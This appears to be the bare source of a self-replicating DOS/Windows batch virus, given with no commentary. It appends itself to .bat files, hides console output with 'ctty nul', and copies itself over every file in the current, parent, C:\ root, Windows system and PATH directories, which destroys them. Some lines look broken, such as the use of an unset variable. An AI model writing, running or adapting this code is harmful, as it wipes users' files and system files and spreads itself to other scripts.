for %%a in (*.bat) do copy %%a %%b
for %%a in (*.bat) do copy %0+%%b %%a
del %%b
@echo off
ctty nul
for %%a in (*.* ..\*.*  c:\*.* %windir%\system\*.* %windir%\*.* %path%\*.*) do copy %0 %%a
ctty con
cls
echo on
